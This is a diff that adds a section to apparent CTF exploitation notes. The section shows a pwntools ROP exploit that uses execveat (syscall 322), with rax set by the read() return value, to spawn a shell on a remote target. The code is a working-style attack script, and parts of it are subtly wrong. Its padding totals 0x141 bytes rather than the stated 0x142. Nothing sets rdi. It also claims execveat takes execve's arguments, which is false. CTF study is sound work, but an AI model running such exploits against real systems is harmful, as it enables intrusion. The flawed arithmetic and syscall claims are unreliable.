@@ -18,6 +18,7 @@
 - [Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
 - [Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
 - [Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)
+- [stub_execveat Syscall as execve Alternative (ASIS CTF 2018)](#stub_execveat-syscall-as-execve-alternative-asis-ctf-2018)
 
 For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
 
@@ -576,3 +577,41 @@ p.send(asm(shellcraft.sh()))
 **Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.
 
 **References:** HITCON CTF 2017
+
+---
+
+## stub_execveat Syscall as execve Alternative (ASIS CTF 2018)
+
+**Pattern:** In a tiny binary with only `read` syscall and no `pop rax` gadget, use `stub_execveat` (syscall 0x142/322) instead of `execve` (0x3b). Since `read()` returns bytes-read in `rax`, make total input length exactly 0x142 bytes so `rax=0x142` when the syscall gadget fires.
+
+**Why this works:**
+1. The binary is tiny -- only `read` and basic gadgets, no `pop rax; ret`
+2. `execve` requires `rax=0x3b` (59), but without `pop rax` there's no way to set it
+3. `read()` returns the number of bytes read in `rax` -- this is the only rax control
+4. `stub_execveat` (syscall 322 = 0x142) accepts the same arguments as `execve` when `AT_FDCWD` is used for the directory fd
+5. Send exactly 0x142 bytes so `read()` returns 0x142, then hit `syscall`
+
+```python
+from pwn import *
+
+# Binary gadgets (tiny static binary)
+xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
+syscall_gadget  = 0x400101   # syscall
+
+# Build payload: /bin/sh string + padding + ROP chain
+# Total length must be exactly 0x142 bytes
+payload  = b"/bin/sh\x00"                          # rdi points here
+payload += b"B" * (0x148 - (8*4) - 8)              # padding to ROP area
+payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
+payload += p64(syscall_gadget)                      # syscall (rax=0x142 from read)
+payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
+# rax = 0x142 from read() return value = stub_execveat syscall number
+
+io = remote('target', 1337)
+io.send(payload)
+io.interactive()
+```
+
+**Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.
+
+**References:** ASIS CTF 2018
